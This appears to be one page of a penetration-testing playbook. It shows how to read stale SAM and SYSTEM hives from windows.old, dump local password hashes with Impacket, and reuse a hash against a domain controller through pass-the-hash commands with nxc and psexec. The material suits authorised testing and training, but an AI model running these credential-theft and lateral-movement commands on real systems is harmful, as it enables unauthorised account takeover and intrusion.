# AD - Stale Hive Credential Reuse (windows.old)

**Step 43B of 50 · AD**

*Read a readable C:\windows.old (or backup) SAM/SYSTEM to recover a local account hash, then reuse it if it matches a domain account.*

## When to use this page

Use this page when a low-privileged user can read files from `C:\windows.old\Windows\System32\config\` — typically `SAM` and `SYSTEM`.

## Find and inspect

```cmd
dir C:\windows.old\Windows\System32\config
```

## Extract and parse the hives

Save to a temporary location (or download), then parse offline with Impacket.

```bash
# Parse offline in Kali:
impacket-secretsdump -sam loot/old-sam.hiv -system loot/old-system.hiv LOCAL
```

## Reuse the recovered hash

```bash
nxc smb $DCip -u tom_admin -H $NThash
nxc smb $BoxIP -u tom_admin -H $NThash
impacket-psexec $Domain/tom_admin@$DCip -hashes :$NThash
```

## Notes & safety

- Do not attempt to overwrite the stale hives. Only read/copy.
- Password reuse means a local NT hash can be valid for a domain account.
- Log the recovered RID, username, and hash path in the engagement (do not paste the full hash here).
- If local-only, subject to UAC/remote token filtering.
